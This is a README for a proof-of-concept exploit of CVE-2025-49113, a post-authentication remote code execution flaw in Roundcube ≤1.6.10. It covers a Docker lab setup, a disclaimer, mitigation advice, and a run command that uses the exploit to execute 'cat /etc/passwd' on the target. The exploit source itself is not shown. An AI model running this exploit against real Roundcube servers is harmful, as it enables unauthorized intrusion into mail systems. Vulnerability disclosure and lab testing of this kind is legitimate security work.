# 📧 Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

## 🔍 Writeup

A critical post-authentication Remote Code Execution vulnerability was discovered in Roundcube (versions ≤ 1.6.10), caused by insecure PHP object deserialization. This severe flaw has silently persisted in the codebase for over **10 years**.

For the full technical writeup and exploitation details, visit:

👉 [https://fearsoff.org/research/roundcube](https://fearsoff.org/research/roundcube)

---

## 🐳 Quick Installation (via Docker)

This will install Ubuntu 24.04, Roundcube, and all necessary dependencies inside a Docker container:

```bash
docker run --name ubuntu24 \
  -p 9876:80 \
  -v "$PWD/rc_install.sh":/root/rc_install.sh \
  -it ubuntu:24.04 \
  bash -c "chmod +x /root/rc_install.sh && /root/rc_install.sh && exec bash"
``` 

> ⚠️ **Note**: Use only in isolated environments. Do **not** expose vulnerable instances to the public internet.

## ⚠️ Disclaimer

This proof-of-concept code is provided for educational and research purposes only. The author and contributors assume no responsibility for any misuse or damage resulting from the use of this code. Unauthorized use on systems you do not own or have explicit permission to test is illegal and strictly prohibited.

## Run:
Make sure you have `php` installed on the system
```
php CVE-2025-49113.php http://127.0.0.1:9876/ roundcube fearsoff.org "cat /etc/passwd > /tmp/pwned"
```


## 👤 Author & Credits

- **Author**: Kirill Firsov ([https://x.com/k_firsov](https://x.com/k_firsov))  
- **Organization**: FearsOff ([https://fearsoff.org](https://fearsoff.org))

---

## 🛡️ Mitigation

If you're running Roundcube ≤ 1.6.10, update to the latest patched version immediately to eliminate this vulnerability.

---

## 📜 License

This project and associated documentation are provided under the MIT License.
